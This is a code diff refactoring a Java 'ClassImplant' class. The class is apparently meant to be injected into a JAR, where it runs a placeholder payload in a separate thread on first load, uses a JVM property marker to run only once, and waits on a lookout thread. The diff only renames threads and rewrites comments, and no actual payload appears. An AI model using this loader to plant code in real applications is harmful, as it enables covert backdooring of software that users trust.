@@ -29,7 +29,7 @@ public class ClassImplant implements Runnable, Thread.UncaughtExceptionHandler {
      * In other words: Only set this to 'true' if your implant payload does something quick and it _needs_ to be done
      * in full. Don't set this to 'true' if the implant payload listens for connections or waits for something to
      * happen. However, *do* set this to 'true' if you want the payload to always finish what it's doing.</p>
-     * <p>Essentially, setting this to 'false' makes the implant background thread a "daemon thread". This means that
+     * <p>Essentially, setting this to 'false' makes the implant payload thread a "daemon thread". This means that
      * the JVM will not wait for it when all regular threads (like the main thread) are done.</p>
      */
     static volatile boolean CONF_BLOCK_JVM_SHUTDOWN = false;
@@ -53,28 +53,22 @@ public class ClassImplant implements Runnable, Thread.UncaughtExceptionHandler {
     public static void init() {
         if (System.getProperty(CONF_JVM_MARKER_PROP) == null) {
             if (System.setProperty(CONF_JVM_MARKER_PROP, "true") == null) {
+                // Run the payload in a separate thread:
                 ClassImplant implant = new ClassImplant();
-                Thread background = new Thread(implant);
-                background.setDaemon(!CONF_BLOCK_JVM_SHUTDOWN);
-                background.setUncaughtExceptionHandler(implant);
-                background.start();
+                Thread payloadThread = new Thread(implant);
+                payloadThread.setDaemon(!CONF_BLOCK_JVM_SHUTDOWN);
+                payloadThread.setUncaughtExceptionHandler(implant);
+                payloadThread.start();
 
-                /*
-                 * Run a lookout thread that waits for all other (non-daemon) threads in the JVM to finish.
-                 * If backwards compatibility pre Java 8 is required, then the Runnable supplied to the lookout thread
-                 * needs to be a separate class instead of a lambda function. Since *this* class is already used as a
-                 * Runnable for the payload thread, that means one more .class file needs to be injected into the JAR.
-                 * If needed, just put waitForOtherThreads in a separate class, make it implement Runnable and supply
-                 * an instance of that class to the constructor of the lookout thread.
-                 */
-                Thread lookout = new Thread(() -> waitForOtherThreads(background));
-                lookout.start();
+                // Run a lookout thread that waits for all other (non-daemon) threads in the JVM to finish:
+                Thread lookoutThread = new Thread(() -> waitForOtherThreads(payloadThread));
+                lookoutThread.start();
             }
         }
     }
 
     /**
-     * Entry point for the background thread.
+     * Entry point for the payload thread.
      * <p>This is the place to put your own payload code.</p>
      */
     @Override
